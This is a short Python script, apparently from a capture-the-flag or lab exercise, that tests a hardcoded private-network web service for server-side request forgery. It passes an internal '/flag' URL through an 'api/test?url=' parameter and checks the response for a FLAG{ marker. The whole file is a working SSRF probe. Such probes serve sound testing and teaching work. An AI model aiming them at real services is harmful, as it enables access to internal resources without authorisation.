import requests

def test_ssrf_vulnerability(target_url):
    # Define the potential URL that we will send to the target application
    attack_url = "http://192.168.2.69:3000/api/test?url="  # This is our SSRF target
    
    # Craft a payload to test if the application uses input for constructing URLs
    test_payload = "http://192.168.2.69/flag"  # A potential flag URL within the local network
    
    try:
        response = requests.get(f"{attack_url}{test_payload}")
        # Check if the response contains a specific success signal, e.g., 'FLAG{...}' or any known pattern
        if "FLAG{" in response.text:
            print("RESULT: SUCCESS")
            print(f"Evidence: {response.text}")
        else:
            print("RESULT: NO_SIGNAL")
    except Exception as e:
        print(f"An error occurred: {e}")
        print("RESULT: NO_SIGNAL")

if __name__ == "__main__":
    # Hardcoded target URL for the test
    target_url = "http://192.168.2.69:3000"
    
    # Run the test function with the hardcoded target URL
    test_ssrf_vulnerability(target_url)